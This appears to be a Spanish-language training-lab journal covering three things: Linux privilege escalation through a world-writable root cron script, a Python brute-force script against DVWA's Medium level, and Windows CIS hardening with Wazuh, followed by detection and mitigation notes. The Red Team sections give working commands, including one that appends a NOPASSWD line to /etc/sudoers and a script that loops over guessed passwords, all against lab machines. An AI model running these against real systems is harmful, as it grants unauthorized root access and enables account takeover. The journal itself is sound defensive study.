# Día 18 — Privilege Escalation Linux: Cron + Brute Force Medium + Wazuh Hardening

**Fecha:** Abril 2026  
**MITRE:** T1053.003, T1110.001  
**DVWA:** Brute Force (Medium)

---

## Teoría

### Privilege Escalation — Cron Jobs
Un cron job es una tarea programada en Linux que se ejecuta automáticamente a intervalos definidos. Si un script ejecutado por root tiene permisos de escritura para usuarios sin privilegios, el atacante puede modificarlo para ejecutar código arbitrario como root. El vector es especialmente peligroso porque no requiere interacción del administrador — el cron lo ejecuta automáticamente.

### Brute Force Medium
En nivel Low no hay protección — los intentos se procesan a máxima velocidad. En nivel Medium DVWA agrega un `sleep(2)` en PHP después de cada intento fallido, haciendo que un ataque de fuerza bruta sea menos eficiente pero no imposible. Con una wordlist pequeña el impacto es mínimo — con 14 millones de contraseñas la diferencia es de horas a semanas.

---

## Red Team

### Sección 1 — Configurar entorno Cron vulnerable

Desde vboxuser se creó un script ejecutado por root via cron con permisos de escritura para todos:

```bash
sudo bash -c 'echo "#!/bin/bash\necho healthy" > /opt/cleanup.sh'
sudo chmod 777 /opt/cleanup.sh
sudo chown root:root /opt/cleanup.sh
sudo crontab -e
```

Cron job agregado:
```
* * * * * /opt/cleanup.sh
```

**El error de configuración:** root ejecuta el script cada minuto pero cualquier usuario puede modificarlo — `chmod 777` da permisos de escritura a todos.

### Sección 2 — Explotación via Cron

Desde lowpriv se modificó el script para agregar lowpriv como sudoer completo:

```bash
echo 'echo "lowpriv ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers' > /opt/cleanup.sh
```

Después de un minuto cron ejecutó el script como root:

```bash
sudo -l
```
```
User lowpriv may run the following commands on Ubuntu-Victim:
    (ALL) NOPASSWD: /usr/bin/python3
    (ALL) NOPASSWD: ALL
```

Escalada a root:
```bash
sudo bash
```
```
root@Ubuntu-Victim:/home/lowpriv#
whoami → root
id     → uid=0(root) gid=0(root) groups=0(root)
```

**Cadena completa:**
```
lowpriv detecta /opt/cleanup.sh con permisos 777
    ↓
Modifica el script para agregar lowpriv a /etc/sudoers
    ↓
Cron ejecuta el script como root cada minuto
    ↓
lowpriv tiene sudo ALL → sudo bash → uid=0(root)
```

**Comparación de técnicas de escalada:**

| Técnica | Día | uid | euid | Requisito |
|---------|-----|-----|------|-----------|
| SUID | 16 | 1001 | 0 | Binario con bit SUID |
| Sudo misc | 17 | 0 | 0 | sudo mal configurado |
| Cron | 18 | 0 | 0 | Script con permisos 777 |

### Sección 3 — DVWA Brute Force (Medium)

Medium agrega `sleep(2)` tras cada intento fallido — ralentiza ataques masivos pero no los previene. El formulario no tiene CSRF token en el endpoint de brute force, solo en el login.

Script Python con sesión autenticada:

```python
import requests
import re

passwords = ["123456", "admin", "password", "letmein", "qwerty"]

s = requests.Session()
s.cookies.set("security", "medium")

r = s.get("http://192.168.1.96:8080/login.php")
token = re.search(r"user_token' value='([^']+)'", r.text).group(1)
s.post("http://192.168.1.96:8080/login.php", data={
    "username": "admin",
    "password": "password",
    "Login": "Login",
    "user_token": token
})

for pwd in passwords:
    r = s.get("http://192.168.1.96:8080/vulnerabilities/brute/", params={
        "username": "admin",
        "password": pwd,
        "Login": "Login"
    })
    if "Welcome to the password protected area" in r.text:
        print(f"[+] Credenciales encontradas: admin / {pwd}")
        break
    else:
        print(f"[-] Fallido: {pwd}")
```

**Output:**
```
[-] Fallido: 123456
[-] Fallido: admin
[+] Credenciales encontradas: admin / password
```

**Diferencia Low vs Medium:**

| | Low | Medium |
|--|--|--|
| Protección | Sin protección | sleep(2) por intento fallido |
| Wordlist 5 passwords | Instantáneo | ~8 segundos |
| Wordlist 14M passwords | Horas | Semanas |
| ¿Bypasseable? | Sí | Sí |

---

## Wazuh Hardening

### Contexto
Score CIS al inicio del día: **25%** (123 passed / 351 failed).

Se corrigieron checks del filtro "service" en Configuration Assessment agrupados en 4 grupos.

### Grupo 1 — 20 Servicios deshabilitados

```powershell
$services = @(
    "BTAGService", "bthserv", "MapsBroker", "lfsvc", "lltdsvc",
    "MSiSCSI", "wercplsupport", "RasAuto", "TermService", "UmRdpService",
    "RpcLocator", "LanmanServer", "SSDPSRV", "upnphost", "WerSvc",
    "Wecsvc", "WMPNetworkSvc", "icssvc", "WpnService", "PushToInstall"
)
foreach ($svc in $services) {
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\$svc" -Name "Start" -Value 4
}
```

Servicios críticos deshabilitados:
- **LanmanServer** — SMB file sharing — vector EternalBlue
- **TermService** — Remote Desktop — vector brute force remoto
- **WerSvc** — Windows Error Reporting — filtra información del sistema

### Grupo 2 — Auditoría adicional

```powershell
auditpol /set /subcategory:"Otros eventos de inicio y cierre de sesión" /success:enable /failure:enable
auditpol /set /subcategory:"Cambio de la directiva del nivel de reglas de MPSSVC" /success:enable /failure:enable
auditpol /set /subcategory:"Controlador IPsec" /success:enable /failure:enable
auditpol /set /subcategory:"Otros eventos de sistema" /success:enable /failure:enable
auditpol /set /subcategory:"Extensión del sistema de seguridad" /success:enable
```

MPSSVC audita cambios en el firewall de Windows — permite detectar si un atacante modifica reglas para abrir puertos.

### Grupo 3 — Configuraciones de red y seguridad

```powershell
# IP Source Routing — deshabilitar (previene intercepción de tráfico)
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" -Name "DisableIPSourceRouting" -Value 2 -Type DWord
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip6\Parameters" -Name "DisableIPSourceRouting" -Value 2 -Type DWord

# ICMP Redirects — deshabilitar (previene MITM)
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" -Name "EnableICMPRedirect" -Value 0 -Type DWord

# KeepAliveTime y TcpMaxDataRetransmissions
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" -Name "KeepAliveTime" -Value 300000 -Type DWord
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" -Name "TcpMaxDataRetransmissions" -Value 3 -Type DWord

# LSASS protección — previene credential dumping con Mimikatz
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RunAsPPL" -Value 1 -Type DWord
```

**LSASS RunAsPPL** es la corrección más crítica — convierte el proceso de credenciales en proceso protegido, bloqueando herramientas como Mimikatz.

### Grupo 4 — Privacidad y telemetría

```powershell
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\InputPersonalization" -Name "AllowInputPersonalization" -Value 0 -Type DWord
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\PushNotifications" -Name "NoCloudApplicationNotification" -Value 1 -Type DWord
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Peernet" -Name "Disabled" -Value 1 -Type DWord
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\MicrosoftAccount" -Name "DisableUserAuth" -Value 1 -Type DWord
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Windows Error Reporting" -Name "Disabled" -Value 1 -Type DWord
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Messaging" -Name "AllowMessageSync" -Value 0 -Type DWord
```

---

## Blue Team

### Detección Cron Privilege Escalation
- Monitorear modificaciones a scripts ejecutados por root: `find / -user root -perm -o+w -type f`
- Auditar `/etc/sudoers` — cambios inesperados son señal de compromiso
- Si Wazuh tuviera agente en Ubuntu — File Integrity Monitoring detectaría la modificación de `/opt/cleanup.sh`

### Mitigación Cron
- Nunca usar `chmod 777` en scripts ejecutados por root
- Auditar crontabs regularmente: `crontab -l` y `/etc/cron*`
- Scripts de cron deben ser propiedad de root con permisos `700`

### Mitigación Brute Force
- Account lockout después de N intentos fallidos
- CAPTCHA en formularios de login
- Rate limiting por IP — no solo delay en la respuesta

---

## Conclusión

Cron misconfiguration es un vector silencioso — el ataque ocurre sin interacción del administrador y puede tardar hasta un minuto en ejecutarse. Brute Force Medium demuestra que el sleep(2) es una mitigación débil — ralentiza pero no bloquea. El hardening de Wazuh redujo significativamente la superficie de ataque deshabilitando 20 servicios innecesarios y aplicando protecciones críticas como LSASS RunAsPPL y deshabilitar IP Source Routing e ICMP Redirects.
